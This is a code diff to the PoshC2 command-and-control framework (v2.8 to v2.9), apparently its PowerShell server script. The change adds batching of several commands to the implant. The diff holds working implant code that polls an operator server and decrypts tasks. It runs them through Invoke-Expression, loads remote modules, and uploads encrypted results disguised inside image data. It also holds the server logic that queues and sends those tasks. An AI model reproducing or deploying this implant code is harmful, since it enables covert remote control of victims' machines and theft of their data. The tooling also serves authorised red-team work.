@@ -18,7 +18,7 @@ Write-Host -Object " |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/ "  -Fore
 Write-Host -Object " |    |  (  <_> )___ \|   Y  \ \     \____/       \ "  -ForegroundColor Green
 Write-Host -Object " |____|   \____/____  >___|  /  \______  /\_______ \"  -ForegroundColor Green
 Write-Host -Object "                    \/     \/          \/         \/"  -ForegroundColor Green
-Write-Host "=============== v2.8 www.PoshC2.co.uk ==============" -ForegroundColor Green
+Write-Host "=============== v2.9 www.PoshC2.co.uk ==============" -ForegroundColor Green
 Write-Host "====================================================" `n -ForegroundColor Green
 
 if (!$RestartC2Server) {
@@ -1410,7 +1410,7 @@ $sleeptime = '+$defaultbeacon+'
 $payload = "' + "$payload"+'"
 
 function getimgdata($cmdoutput) {
-    $icoimage = "'+$imageArray[-1]+'","'+$imageArray[0]+'","'+$imageArray[1]+'","","'+$imageArray[2]+'","'+$imageArray[3]+'"
+    $icoimage = "'+$imageArray[-1]+'","'+$imageArray[0]+'","'+$imageArray[1]+'"`,"'+$imageArray[2]+'","'+$imageArray[3]+'"
     $image = $icoimage|get-random
 
     function randomgen 
@@ -1532,11 +1532,59 @@ while($true)
     $Server = "$ServerClean/$RandomURI$URI"
     $ReadCommand = (Get-Webclient).DownloadString("$Server")
 
-    while($ReadCommand) {
+     while($ReadCommand) {
         $ReadCommandClear = Decrypt-String $key $ReadCommand
         $error.clear()
-        if ($ReadCommandClear -ne "fvdsghfdsyyh") {
-            if  ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
+        if (($ReadCommandClear) -and ($ReadCommandClear -ne "fvdsghfdsyyh")) {
+            if  ($ReadCommandClear.ToLower().StartsWith("multicmd")) {
+                    $splitcmd = $ReadCommandClear -replace "multicmd",""
+                    $split = $splitcmd -split "!d-3dion@LD!-d"
+                    foreach ($i in $split){
+                        $error.clear()
+                        if  ($i.ToLower().StartsWith("upload-file")) {
+                            try {
+                                $Output = Invoke-Expression $i | out-string
+                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
+                                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
+                                $ModuleLoaded = Encrypt-String $key $result
+                                $Output = Encrypt-String2 $key $Output
+                                $UploadBytes = getimgdata $Output
+                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
+                            } catch {
+                                $Output = "ErrorUpload: " + $error[0]
+                            }
+                        } elseif  ($i.ToLower().StartsWith("loadmodule")) {
+                            try {
+                                $modulename = $i -replace "LoadModule",""
+                                $Output = Invoke-Expression $modulename | out-string  
+                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
+                                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
+                                $Output = Encrypt-String2 $key $Output
+                                $UploadBytes = getimgdata $Output
+                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
+                            } catch {
+                                $Output = "ErrorLoadMod: " + $error[0]
+                            }
+                        } else {
+                            try {
+                                $Output = Invoke-Expression $i | out-string  
+                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
+                                $StdError = ($error[0] | Out-String)
+                                if ($StdError){
+                                $Output = $Output + $StdError
+                                $error.clear()
+                                }
+                            } catch {
+                                $Output = "ErrorCmd: " + $error[0]
+                            }
+                            $Output = Encrypt-String2 $key $Output
+                            $Response = Encrypt-String $key $i
+                            $UploadBytes = getimgdata $Output
+                            (Get-Webclient -Cookie $Response).UploadData("$Server", $UploadBytes)|out-null
+                        }
+                    } 
+            }
+            elseif  ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
                 try {
                 $Output = Invoke-Expression $ReadCommandClear | out-string
                 $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
@@ -1546,7 +1594,7 @@ while($true)
                 $UploadBytes = getimgdata $Output
                 (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                 } catch {
-                    $Output = "Error: " + $error[0]
+                    $Output = "ErrorUpload: " + $error[0]
                 }
 
             } elseif  ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
@@ -1559,7 +1607,7 @@ while($true)
                 $UploadBytes = getimgdata $Output
                 (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                 } catch {
-                    $Output = "Error: " + $error[0]
+                    $Output = "ErrorLoadMod: " + $error[0]
                 }
 
             } else {
@@ -1572,7 +1620,7 @@ while($true)
                     $error.clear()
                     }
                 } catch {
-                    $Output = "Error: " + $error[0]
+                    $Output = "ErrorCmd: " + $error[0]
                 }
 
             $Output = Encrypt-String2 $key $Output
@@ -1651,8 +1699,9 @@ $sleeptime = '+$defaultbeacon+'
 $payload = "' + "$payload"+'"
 
 function getimgdata($cmdoutput) {
-    $icoimage = "'+$imageArray[-1]+'","'+$imageArray[0]+'","'+$imageArray[1]+'","","'+$imageArray[2]+'","'+$imageArray[3]+'"
-    $image = $icoimage|get-random
+    $icoimage = @("'+$imageArray[-1]+'","'+$imageArray[0]+'","'+$imageArray[1]+'","'+$imageArray[2]+'","'+$imageArray[3]+'")
+    
+    try {$image = $icoimage|get-random}catch{}
 
     function randomgen 
     {
@@ -1758,6 +1807,7 @@ function Decrypt-String2($key, $encryptedStringWithIV) {
 $URI= "'+$randomuri+'"
 $Server = "'+$ipv4address+":"+$serverport+'/'+$randomuri+'"
 $ServerClean = "'+$ipv4address+":"+$serverport+'"
+
 while($true)
 {
     $date = (Get-Date -Format "dd/MM/yyyy")
@@ -1772,12 +1822,60 @@ while($true)
     $RandomURI = Get-Random $URLS
     $Server = "$ServerClean/$RandomURI$URI"
     $ReadCommand = (Get-Webclient).DownloadString("$Server")
-
+    
     while($ReadCommand) {
         $ReadCommandClear = Decrypt-String $key $ReadCommand
         $error.clear()
-        if ($ReadCommandClear -ne "fvdsghfdsyyh") {
-            if  ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
+        if (($ReadCommandClear) -and ($ReadCommandClear -ne "fvdsghfdsyyh")) {
+            if  ($ReadCommandClear.ToLower().StartsWith("multicmd")) {
+                    $splitcmd = $ReadCommandClear -replace "multicmd",""
+                    $split = $splitcmd -split "!d-3dion@LD!-d"
+                    foreach ($i in $split){
+                        $error.clear()
+                        if  ($i.ToLower().StartsWith("upload-file")) {
+                            try {
+                                $Output = Invoke-Expression $i | out-string
+                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
+                                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
+                                $ModuleLoaded = Encrypt-String $key $result
+                                $Output = Encrypt-String2 $key $Output
+                                $UploadBytes = getimgdata $Output
+                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
+                            } catch {
+                                $Output = "ErrorUpload: " + $error[0]
+                            }
+                        } elseif  ($i.ToLower().StartsWith("loadmodule")) {
+                            try {
+                                $modulename = $i -replace "LoadModule",""
+                                $Output = Invoke-Expression $modulename | out-string  
+                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
+                                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
+                                $Output = Encrypt-String2 $key $Output
+                                $UploadBytes = getimgdata $Output
+                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
+                            } catch {
+                                $Output = "ErrorLoadMod: " + $error[0]
+                            }
+                        } else {
+                            try {
+                                $Output = Invoke-Expression $i | out-string  
+                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
+                                $StdError = ($error[0] | Out-String)
+                                if ($StdError){
+                                $Output = $Output + $StdError
+                                $error.clear()
+                                }
+                            } catch {
+                                $Output = "ErrorCmd: " + $error[0]
+                            }
+                            $Output = Encrypt-String2 $key $Output
+                            $Response = Encrypt-String $key $i
+                            $UploadBytes = getimgdata $Output
+                            (Get-Webclient -Cookie $Response).UploadData("$Server", $UploadBytes)|out-null
+                        }
+                    } 
+            }
+            elseif  ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
                 try {
                 $Output = Invoke-Expression $ReadCommandClear | out-string
                 $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
@@ -1787,20 +1885,20 @@ while($true)
                 $UploadBytes = getimgdata $Output
                 (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                 } catch {
-                    $Output = "Error: " + $error[0]
+                    $Output = "ErrorUpload: " + $error[0]
                 }
 
             } elseif  ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
                 try {
-                    $modulename = $ReadCommandClear -replace "LoadModule",""
-                    $Output = Invoke-Expression $modulename | out-string  
-                    $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
-                    $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
-                    $Output = Encrypt-String2 $key $Output
-                    $UploadBytes = getimgdata $Output
-                    (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
+                $modulename = $ReadCommandClear -replace "LoadModule",""
+                $Output = Invoke-Expression $modulename | out-string  
+                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
+                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
+                $Output = Encrypt-String2 $key $Output
+                $UploadBytes = getimgdata $Output
+                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                 } catch {
-                    $Output = "Error: " + $error[0]
+                    $Output = "ErrorLoadMod: " + $error[0]
                 }
 
             } else {
@@ -1813,7 +1911,7 @@ while($true)
                     $error.clear()
                     }
                 } catch {
-                    $Output = "Error: " + $error[0]
+                    $Output = "ErrorCmd: " + $error[0]
                 }
 
             $Output = Encrypt-String2 $key $Output
@@ -1840,53 +1938,62 @@ $message =[Convert]::ToBase64String($Bytes)
         $im_results = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE RandomURI='$ranuri'" -As PSObject
         $key = $im_results.Key
         $hostname = $im_results.Hostname
-        $dbresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM NewTasks WHERE RandomURI='$ranuri' Limit 1" -As PSObject
-        $taskid = $dbresults.Command
-        $taskidtime = $dbresults.TaskID
         $currenttime = (Get-Date)
+        $multicmdresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM NewTasks WHERE RandomURI='$ranuri'" -As PSObject
+        # send multi commands to the client 
+        if (($request.Url -like "*$ranuri*") -and ($request.HttpMethod -eq 'GET') -and ($multicmdresults))
+        {
+            $message = $null
+            foreach ($i in $multicmdresults) {
+                $taskid = $i.Command
+                $taskidtime = $i.TaskID
 
-        # if the commands dont include all get-screenshot, download-file, upload-file, loadmodule then do x
-        # if more than one command do the following again and again
-        # if more than one command, each command is split by some delimeter
-
-        # send the actual command to the client 
-        if (($request.Url -like "*$ranuri*") -and ($request.HttpMethod -eq 'GET') -and ($taskid))
-        {   
-            if (!$taskid.ToLower().startswith('fvdsghfdsyyh')) {
-                Write-Host "Command issued against host: $hostname" -ForegroundColor Yellow
-                if  ($taskid.ToLower().startswith('upload-file')) {
-                Write-Host -Object "Uploading File" -ForegroundColor Yellow
-                } else {
-                Write-Host -Object $taskid -ForegroundColor Yellow
+                if (!$taskid.ToLower().startswith('fvdsghfdsyyh')) {
+                    Write-Host "Command issued against host: $hostname" -ForegroundColor Yellow
+                    if  ($taskid.ToLower().startswith('upload-file')) {
+                    Write-Host -Object "Uploading File" -ForegroundColor Yellow
+                    } else {
+                    Write-Host -Object $taskid -ForegroundColor Yellow
+                    }
                 }
-            }
-            if ($taskid.ToLower().StartsWith("loadmodule")) 
-            {
-                $modulename = $taskid -replace 'LoadModule ', '' 
-
-                if (Test-Path "$PoshPath\Modules\$modulename") {
-                $module = (Get-Content -Path "$PoshPath\Modules\$modulename") -join "`n"
-                # ensure the module name 
-                $module = "LoadModule"+$module
-                $fromstring = Encrypt-String $key $module
-                $commandsent = $fromstring
-                $message = $fromstring 
-                } else {
-                $message = 'fvdsghfdsyyh'
-                Write-Host "Error finding module"
+                if ($taskid.ToLower().StartsWith("loadmodule")) 
+                {
+                    $modulename = $taskid -replace 'LoadModule ', '' 
+                    if (Test-Path "$PoshPath\Modules\$modulename") {
+                    $module = (Get-Content -Path "$PoshPath\Modules\$modulename") -join "`n"
+                    # ensure the module name 
+                    $module = "LoadModule"+$module
+                    if ($message) {
+                        $message = $message + "!d-3dion@LD!-d" + $module
+                    } else {
+                        $message = $module 
+                    }
+                    } else {
+                    Write-Host "Error finding module"
+                    }
                 }
+                else 
+                {
+                    if ($message) {
+                        $message = $message + "!d-3dion@LD!-d" + $taskid
+                    } else {
+                        $message = $taskid 
+                    }
+                }
+                Invoke-SqliteQuery -DataSource $Database -Query "DELETE FROM NewTasks WHERE RandomURI='$ranuri' and TaskID='$taskidtime'"|out-null
             }
-            else 
-            {
-                Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET LastSeen='$(get-date)' WHERE RandomURI='$ranuri'"|out-null
-                $fromstring = Encrypt-String $key $taskid
-                $commandsent = $fromstring
-                $message = $fromstring
+
+            if ($multicmdresults.Count -gt 1){
+                $message = "multicmd" + $message
             }
-            Invoke-SqliteQuery -DataSource $Database -Query "DELETE FROM NewTasks WHERE RandomURI='$ranuri' and TaskID='$taskidtime'"|out-null
-        } 
+            Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET LastSeen='$(get-date)' WHERE RandomURI='$ranuri'"|out-null
+            $fromstring = Encrypt-String $key $message
+            $commandsent = $fromstring
+            $message = $fromstring                    
+        }
+        
         # send the default command/response if there is no command
-        if (($request.Url -like "*$ranuri*") -and ($request.HttpMethod -eq 'GET') -and (!$taskid)) 
+        if (($request.Url -like "*$ranuri*") -and ($request.HttpMethod -eq 'GET') -and ($multicmdresults.Count -eq 0)) 
         { 
             Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET LastSeen='$(get-date)' WHERE RandomURI='$ranuri'"|out-null
             $message = 'fvdsghfdsyyh'
@@ -1959,7 +2066,7 @@ $message =[Convert]::ToBase64String($Bytes)
                 }
                 $backToPlainText = "Captured Screenshot: $global:newdir\downloads\$randomimageid.png 123456<>654321"
             }
-            # if the task was to downloa a file, dump it directly to disk
+            # if the task was to download a file, dump it directly to disk
             if  ($cookieplaintext.tolower().startswith('download-file'))
             {
                 try {
